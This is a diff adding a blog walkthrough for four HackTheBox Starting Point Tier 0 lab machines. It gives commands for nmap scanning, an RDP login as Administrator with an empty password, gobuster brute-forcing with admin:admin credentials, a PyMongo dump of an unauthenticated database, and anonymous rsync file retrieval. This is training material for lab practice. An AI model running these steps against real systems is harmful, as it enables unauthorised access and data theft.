@@ -1,0 +1,301 @@
+---
+title: "Starting Point: Tier 0 Walkthrough"
+description: "Complete walkthrough and solutions for HackTheBox Starting Point Tier 0 machines: Explosion, Preignition, Mongod, and Synced."
+date: "2026-11-04"
+difficulty: "Very Easy"
+points: "150"
+published: true
+---
+
+# Starting Point: Tier 0 Walkthrough
+
+A comprehensive writeup and reference guide for the **Tier 0** machines in HackTheBox's Starting Point path. Tier 0 focuses on fundamental reconnaissance, service identification, exploiting default configurations, and handling legacy or unauthenticated services.
+
+---
+
+## Overview
+
+| Machine | Target Service | Key Technique / Misconfiguration |
+|---|---|---|
+| **Explosion** | RDP (`3389/tcp`) | Default Administrator account with an empty password |
+| **Preignition** | HTTP (`80/tcp`) | Web directory brute-forcing with Gobuster & default admin credentials |
+| **Mongod** | MongoDB (`27017/tcp`) | Unauthenticated NoSQL database dump using Python / PyMongo |
+| **Synced** | Rsync (`873/tcp`) | Anonymous Rsync daemon module enumeration and file retrieval |
+
+---
+
+## 1. Explosion
+
+Explosion demonstrates how remote desktop protocols with default administrative accounts and missing passwords provide direct graphical footholds.
+
+- **Target service:** RDP (`3389/tcp`)
+- **Key vulnerability:** Remote Desktop Protocol is exposed and configured with the default `Administrator` account allowing authentication with an empty password.
+
+### Enumeration
+
+Scan the target to identify open ports and service versions:
+
+```bash
+nmap -sV -sC <TARGET_IP>
+```
+
+Focus specifically on the default RDP port:
+
+```bash
+nmap -p 3389 -sV <TARGET_IP>
+```
+
+### Exploitation
+
+Connect to the target desktop using FreeRDP (`xfreerdp`):
+
+```bash
+xfreerdp /v:<TARGET_IP> /u:Administrator /p:'' /cert:ignore
+```
+
+If prompted interactively for a password:
+
+```bash
+xfreerdp /v:<TARGET_IP> /u:Administrator /cert:ignore
+```
+
+<Callout type="tip" title="FreeRDP Flag Breakdown">
+- `/v:<TARGET_IP>`: Specifies the target IP or hostname.
+- `/u:Administrator`: Sets the login username to `Administrator`.
+- `/p:''`: Explicitly passes an empty string as the password.
+- `/cert:ignore`: Bypasses TLS/SSL certificate validation errors.
+</Callout>
+
+Once logged in, locate the flag file on the Administrator desktop and submit it.
+
+![Explosion Pwned — 150 XP Earned](/images/writeups/hackthebox/explosion-solved.png)
+
+---
+
+## 2. Preignition
+
+Preignition highlights web application directory discovery and the danger of leaving exposed administrative panels protected only by factory-default credentials.
+
+- **Target service:** HTTP (`80/tcp`)
+- **Key vulnerability:** An administrative portal is discoverable via directory enumeration and accessible with common default credentials (`admin:admin`).
+
+### Enumeration
+
+Begin with an initial port scan to verify web services:
+
+```bash
+nmap -sV -sC <TARGET_IP>
+```
+
+Enumerate hidden directories and web resources using Gobuster:
+
+```bash
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
+```
+
+To search for specific file extensions along with directories:
+
+```bash
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+```
+
+Inspect the results for administrative endpoints (e.g. `/admin`, `/login`, or `/admin.php`).
+
+### Exploitation
+
+1. Navigate to the discovered administrative login URL in your browser.
+2. Supply default administrative credentials:
+
+```text
+Username: admin
+Password: admin
+```
+
+3. Authenticate and retrieve the flag from the dashboard.
+
+<Callout type="info" title="Key Observations">
+- Gobuster performs high-speed directory and file brute-forcing against web servers.
+- HTTP status codes (`200 OK`, `301/302 Redirect`, `403 Forbidden`) pinpoint accessible and hidden pages.
+- Default credentials remain one of the most widespread initial access vectors in corporate and embedded systems.
+</Callout>
+
+![Preignition Pwned — 150 XP Earned](/images/writeups/hackthebox/preignition-solved.png)
+
+---
+
+## 3. Mongod
+
+Mongod introduces NoSQL databases, unauthenticated service interaction, and working around legacy client protocol incompatibilities using custom scripts.
+
+- **Target service:** MongoDB (`27017/tcp`)
+- **Key vulnerability:** MongoDB instance is exposed to the network with authentication completely disabled, exposing sensitive databases and documents.
+
+### Enumeration
+
+Scan port 27017 to confirm MongoDB:
+
+```bash
+nmap -sV -sC -p 27017 <TARGET_IP>
+```
+
+Install the modern MongoDB shell (`mongosh`) if not already present:
+
+```bash
+sudo apt install mongodb-mongosh
+```
+
+Attempt connection:
+
+```bash
+mongosh --host <TARGET_IP> --port 27017
+```
+
+### Compatibility Issue & Workaround
+
+Connecting directly with `mongosh` failed because our local client was MongoDB 8.0.34, whereas the remote server reported maximum wire version 6 (MongoDB 3.6). Modern `mongosh` requires at least wire version 8 (MongoDB 4.2+). 
+
+Attempting to run legacy `mongo` binaries failed due to missing older shared libraries:
+
+```text
+libcrypto.so.1.0.0
+```
+
+Rather than installing legacy libraries into the host OS, we leveraged Python with `pymongo` to bridge the protocol gap.
+
+### Exploitation using PyMongo
+
+Install `pymongo`:
+
+```bash
+pip install pymongo
+```
+
+Connect and enumerate accessible databases:
+
+```python
+from pymongo import MongoClient
+
+client = MongoClient("mongodb://<TARGET_IP>:27017/")
+
+print(client.list_database_names())
+# Discovered databases: ['admin', 'config', 'local', 'sensitive_information', 'users']
+```
+
+Enumerate collections inside target databases:
+
+```python
+for db_name in ['sensitive_information', 'users']:
+    db = client[db_name]
+    print(f"\nDatabase: {db_name}")
+    print(db.list_collection_names())
+```
+
+Query and extract documents:
+
+```python
+db = client['sensitive_information']
+
+for collection_name in db.list_collection_names():
+    print(f"\nCollection: {collection_name}")
+    for document in db[collection_name].find().limit(5):
+        print(document)
+```
+
+<Callout type="tip" title="PyMongo Query API Cheatsheet">
+- `MongoClient(uri)`: Establishes the socket connection to MongoDB.
+- `client.list_database_names()`: Lists all accessible database names.
+- `client['db_name']`: Selects a database.
+- `db.list_collection_names()`: Lists tables/collections.
+- `db['collection'].find().limit(N)`: Queries documents with a result limit.
+</Callout>
+
+![Mongod Pwned — 150 XP Earned](/images/writeups/hackthebox/mongod-solved.png)
+
+---
+
+## 4. Synced
+
+Synced covers the `rsync` protocol, module enumeration, and unauthenticated file synchronization.
+
+- **Target service:** Rsync daemon (`873/tcp`)
+- **Key vulnerability:** An Rsync module allows anonymous read access, permitting arbitrary file retrieval without authentication.
+
+### Enumeration
+
+Scan the target for the Rsync daemon:
+
+```bash
+nmap -sV -sC -p 873 <TARGET_IP>
+```
+
+List available Rsync modules on the server:
+
+```bash
+rsync --list-only <TARGET_IP>::
+```
+
+Inspect the files within the exposed `public` module:
+
+```bash
+rsync --list-only <TARGET_IP>::public/
+```
+
+Example listing:
+
+```text
+drwxr-xr-x          4096 2022/10/24 18:02:23 .
+-rw-r--r--            33 2022/10/24 17:32:03 flag.txt
+```
+
+### Exploitation
+
+Download the flag file from the module:
+
+```bash
+rsync <TARGET_IP>::public/flag.txt .
+```
+
+Or copy with verbose output, archive preservation, and progress display:
+
+```bash
+rsync -avzP <TARGET_IP>::public/flag.txt .
+```
+
+Display the retrieved flag:
+
+```bash
+cat flag.txt
+```
+
+<Callout type="info" title="Rsync Syntax Breakdown">
+- `::`: Indicates connection to an Rsync standalone daemon (not Rsync over SSH).
+- `public`: Name of the configured share/module on the remote daemon.
+- `-a`: Archive mode (preserves permissions, timestamps, symbolic links).
+- `-v`: Verbose output.
+- `-z`: Compress file data during transfer.
+- `-P`: Keeps partially transferred files and displays progress bar.
+</Callout>
+
+![Synced Pwned — 150 XP Earned](/images/writeups/hackthebox/synced-solved.png)
+
+---
+
+## Key Takeaways & Commands Summary
+
+```bash
+# Service & version scanning
+nmap -sV -sC <TARGET_IP>
+
+# RDP connection with empty password
+xfreerdp /v:<TARGET_IP> /u:Administrator /p:'' /cert:ignore
+
+# Web directory brute-forcing
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
+# Rsync module discovery & file download
+rsync --list-only <TARGET_IP>::
+rsync -avzP <TARGET_IP>::public/flag.txt .
+
+# Quick Python NoSQL probe
+python3 -c "import pymongo; c=pymongo.MongoClient('mongodb://<TARGET_IP>:27017/'); print(c.list_database_names())"
+```
